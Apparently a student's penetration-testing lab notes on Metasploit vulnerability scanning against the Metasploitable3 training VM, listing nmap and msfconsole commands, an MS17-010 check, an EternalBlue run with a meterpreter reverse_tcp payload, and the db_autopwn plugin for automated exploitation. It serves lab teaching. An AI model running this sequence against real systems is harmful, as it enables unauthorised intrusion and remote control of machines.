# Vulnerability Scanning with MSF

## Vulnerability Scanning

- Vulnerability Scanning & detection is the process of scanning a target for vulnerabilites and verifying whether they can be exploited
- So far, we have been able to identify and exploit misconigurations on target systems, however, in this section we will be exploring the process of utilizing auxiliary and exploit modules to scan and identify inherent vulnerabilities in services, operating systems and web apps.
- We also be exploring the process of utilizing third party vulnerability scanning tools like Nessus and how we can integrate Nessus functionality in to the MSF.

## Lab Environment 

- For the purposes of demonstrating the vulnerability scanning process, we will be utilizing an intentionally vulnerable virtual machine called Metasploitable3 that is based on Windows Server 2008.
- Metasploitable3 was developed by Rapid7 to demonstrate how MSF can be used to perform exploitation of a Windows System.
- Instructions on how this VM can be setup can be found here: https://bit.ly/3kASwns

## Demo: Vulnerability Scanning with MSF

`sudo nmap -sn [IP/24]`

`ip a s` to get the target IP

`service postgresql start && msfconsole`

msf6:`setg rhosts [targetIP]`

msf6:`setg rhost [targetIP]`

msf6:`workspace -a MS3`

We enumerate the service version with following command which imports the results automatically into the msf database:

msf6:`db_nmap -sS -sV -O [targetIP]`

The information got stored:

msf6:`hosts`

msf6:`services`

How do we utilize this service information to find and identify vulnerabilites?

- We could search for exploits like f.e. `search type:exploit name:Microsoft IIS`, dead end if the msf exploit module don't match the service version running on the target

If we are not sure if a exploit version works for the service version running on the system, we can use the module and type in `info`

msf6:`set payload windows/meterpreter/reverse_tcp`

msf6:`show options`

We need to enumerate the service so we can fill in the variables correctly (port etc.)

msf6:`services`

We take a step back into msf.

msf6:`services`

If we want to search for a msf module, we can use the `search` command or we can use the inbuilt kali linux searchsploit utility:

msf6:`searchsploit "Microsoft Windows SMB | grep -e "Metasploit"`

msf6:`search eternalblue`

First we use the auxiliary module to check if the target is vulnerable:

msf6:`use auxiliary/scanner/smb/smb_ms17_010`

msf6:`show options`

msf6:`run`

msf6:`use exploit/windows/smb/ms17_010_eternalblue`

msf6:`show options`: check if correctly configured

msf6:`run`

We get a meterpreter session.

### Metasploit AutoPWN

https://github.com/hahwul/metasploit-autopwn

The `metasploit-autopwn` repository provides a script that replicates the classic "Autopwn" feature in Metasploit, automating the process of scanning for vulnerabilities, selecting appropriate exploits, and executing them against a target system. It handles exploit management, payload selection, and session handling automatically, simplifying penetration testing tasks. This tool is useful for quickly identifying and exploiting vulnerabilities, but should only be used ethically and with proper authorization.

download repo and move it into /usr/share/metasploit-framework/plugins

msf6:`load db_autopwn`

msf6:`db_autopwn`

msf6:`db_autopwn -p -t`

Specify port range:

msf6:`db_autopwn -p -t -PI 445`

The next step would be enumerate more infos and finding the appropriate exploit to use.

### Analyze command:

Analyzes the contents of the msf databases (hosts and services), and create a list of vulnerabilites the services suffer from.

msf6:`analyze`

msf6:`vulns`















